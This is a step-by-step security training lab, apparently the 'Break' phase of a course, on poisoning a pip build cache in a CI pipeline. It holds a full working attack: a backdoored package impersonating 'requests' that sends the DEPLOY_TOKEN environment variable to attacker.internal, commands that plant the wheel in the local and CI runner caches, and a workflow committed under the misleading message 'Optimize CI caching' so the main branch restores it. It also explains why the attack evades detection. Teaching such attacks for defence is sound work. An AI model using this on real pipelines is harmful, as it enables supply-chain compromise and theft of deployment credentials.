# Lab 2.7: Build Cache Poisoning

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning the Dependency Cache

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/update-deps
```

### Step 2: Create a backdoored package

```bash
mkdir -p /tmp/poison
cat > /tmp/poison/setup.py << 'EOF'
from setuptools import setup
setup(
    name="requests",
    version="2.31.0",
    py_modules=["requests"],
)
EOF

cat > /tmp/poison/requests.py << 'EOF'
import os
import urllib.request

try:
    token = os.environ.get("DEPLOY_TOKEN", "")
    if token:
        urllib.request.urlopen(
            f"http://attacker.internal/collect?token={token}"
        )
except Exception:
    pass

from importlib import import_module as _im
_real = _im("urllib.request")
get = _real.urlopen
EOF

cd /tmp/poison
pip wheel . -w /tmp/poison/dist/
```

### Step 3: Poison the cache

pip has two cache locations: `~/.cache/pip/wheels/` (user-level, used by local `pip install`) and `/runner/_work/_cache/pip/` (CI runner cache, restored from GitHub Actions cache). We poison both because the attack works on either: local development machines via the user cache, CI runners via the restored cache.

```bash
cp /tmp/poison/dist/requests-2.31.0-*.whl ~/.cache/pip/wheels/
mkdir -p /runner/_work/_cache/pip
cp /tmp/poison/dist/requests-2.31.0-*.whl /runner/_work/_cache/pip/
```

### Step 4: Trigger the cache to be saved

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: WeakLink Webapp CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            pip-${{ runner.os }}-

      - name: Install dependencies
        run: |
          pip install --no-index --find-links ~/.cache/pip/wheels/ requests
          pip install -r requirements.txt

      - name: Run tests
        run: python test_app.py
EOF

git add -A
git commit -m "Optimize CI caching"
git push origin feature/update-deps
```

**Checkpoint:** You should now have a backdoored wheel in the pip cache directory, a PR that saves the poisoned cache, and understand how `restore-keys` prefix matching causes the main branch to restore it.

### Step 5: Why this is hard to detect

- **No code changes on main**. the attack is entirely in the cache layer
- **Build logs look normal**. `pip install` says "using cached wheel"
- **The lockfile is unchanged**. `requirements.txt` still says `requests==2.31.0`
- **The poisoned package has the correct version**
- **Cache keys match**. prefix match is a designed feature
